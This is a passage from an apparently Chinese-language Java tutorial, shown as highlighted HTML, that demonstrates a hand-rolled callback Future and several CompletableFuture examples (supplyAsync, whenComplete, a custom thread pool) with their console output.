    <span class="token keyword">private</span> <span class="token keyword">interface</span> <span class="token class-name">Completable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>

        <span class="token keyword">void</span> <span class="token function">complete</span><span class="token punctuation">(</span><span class="token class-name">T</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">void</span> <span class="token function">exception</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> throwable<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">interface</span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>

        <span class="token class-name">T</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">boolean</span> <span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">void</span> <span class="token function">setCompletable</span><span class="token punctuation">(</span><span class="token class-name">Completable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> completable<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Completable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">getCompletable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> callable<span class="token punctuation">)</span> <span class="token punctuation">{</span>


        <span class="token class-name">AtomicReference</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> atomicReference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicReference</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">AtomicBoolean</span> atomicBoolean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicBoolean</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> future <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">private</span> <span class="token class-name">Completable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> completable<span class="token punctuation">;</span>

            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> atomicReference<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> atomicBoolean<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCompletable</span><span class="token punctuation">(</span><span class="token class-name">Completable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> completable<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>completable <span class="token operator">=</span> completable<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token class-name">Completable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">getCompletable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> completable<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>


        <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">T</span> t <span class="token operator">=</span> callable<span class="token punctuation">.</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                atomicReference<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
                atomicBoolean<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>future<span class="token punctuation">.</span><span class="token function">getCompletable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    future<span class="token punctuation">.</span><span class="token function">getCompletable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>future<span class="token punctuation">.</span><span class="token function">getCompletable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    future<span class="token punctuation">.</span><span class="token function">getCompletable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exception</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> future<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token string">"I am finished."</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token string">"Error."</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        result<span class="token punctuation">.</span><span class="token function">setCompletable</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Completable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">complete</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"complete..."</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exception</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> cause<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"exception error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                cause<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"end...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出</p>
<pre class="line-numbers language-none"><code class="language-none">end....
complete...I am finished.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="CompletableFuture-构建异步应用">CompletableFuture 构建异步应用</h2>
<h3 id="模拟异步操作内容">模拟异步操作内容</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFutureSupport</span> <span class="token punctuation">{</span>

    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">static</span> <span class="token keyword">double</span> <span class="token function">getActionBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：get（begin）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10000L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> v <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：get（done）："</span> <span class="token operator">+</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> v<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="模拟1-2">模拟1</h3>
<p>CompletableFuture阻塞等待</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Optional</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">CompletableFuture</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFutureInAction1</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Double</span><span class="token punctuation">&gt;</span></span> completableFuture <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"action:-&gt;"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">double</span> v <span class="token operator">=</span> <span class="token class-name">CompletableFutureSupport</span><span class="token punctuation">.</span><span class="token function">getActionBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            completableFuture<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main.....1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        completableFuture<span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"complete.....2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span>tt <span class="token operator">-&gt;</span> tt<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出</p>
<pre class="line-numbers language-none"><code class="language-none">main.....1
action:-&gt;Thread-0
Thread-0：get（begin）
Thread-0：get（done）：0.30457757812323727
complete.....2
0.30457757812323727<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="模拟2-2">模拟2</h3>
<p>CompletableFuture.supplyAsync 异步请求</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
     * main 线程不会等待whenComplete。
     * main结束的时候，completableFuture的Supplier 未执行完成，线程也会随main的结束而结束
     *
     * @throws ExecutionException
     * @throws InterruptedException
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Double</span><span class="token punctuation">&gt;</span></span> completableFuture <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletableFutureSupport</span><span class="token operator">::</span><span class="token function">getActionBody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"..........................1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        completableFuture<span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：complete_action（begin）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span>tt <span class="token operator">-&gt;</span> tt<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：complete_action（end）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">main<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token number">.1</span>
<span class="token class-name">ForkJoinPool</span><span class="token punctuation">.</span>commonPool<span class="token operator">-</span>worker<span class="token operator">-</span><span class="token number">9</span>：get（begin）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="模拟3-2">模拟3</h3>
<p>改写模拟2，不使用阻塞的方式</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 不以守护进程的方式运行</span>
            thread<span class="token punctuation">.</span><span class="token function">setDaemon</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> thread<span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Double</span><span class="token punctuation">&gt;</span></span> completableFuture <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token class-name">CompletableFutureSupport</span><span class="token operator">::</span><span class="token function">getActionBody</span><span class="token punctuation">,</span> executorService<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// main</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"..........................1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        completableFuture<span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：complete_action（begin）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span>tt <span class="token operator">-&gt;</span> tt<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：complete_action（end）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// main</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"..........................2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 需要显示关闭线程</span>
        <span class="token comment">// 执行先前提交的任务后，启动有序关闭。如果已经关闭，调用没有额外的影响</span>
        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// main</span>
